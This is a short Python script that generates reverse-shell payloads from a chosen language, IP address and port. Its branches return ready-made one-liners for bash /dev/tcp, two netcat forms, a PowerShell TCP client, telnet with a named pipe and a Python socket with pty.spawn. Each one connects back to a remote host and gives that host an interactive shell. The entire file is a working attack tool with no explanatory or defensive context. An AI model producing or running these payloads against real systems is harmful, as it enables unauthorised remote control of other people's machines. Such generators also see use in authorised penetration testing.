#!/usr/bin/env python3

import argparse

def generate_payload(language, ip, port):
    if language == "bash":
        return f'bash -c \'bash -i &>/dev/tcp/{ip}/{port} <&1\''
    elif language == "nc1":
        return f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
    elif language == "nc2":
        return f'nc -e /bin/sh {ip} {port}'
    elif language == "powershell":
        return f'powershell -c \'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\''
    elif language == "telnet":
        return f'TF=$(mktemp -u); mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF'
    elif language == "python":
        return f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
    else:
        return "Language not supported"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate reverse shell payloads.")
    parser.add_argument("language", choices=["bash", "nc1", "nc2", "powershell", "telnet", "python"], help="The language of the payload.")
    parser.add_argument("ip", help="The IP address to connect back to.")
    parser.add_argument("port", type=int, help="The port to connect back to.")
    args = parser.parse_args()

    payload = generate_payload(args.language, args.ip, args.port)
    print("\nGenerated payload:\n")
    print(payload)
    print("\n")
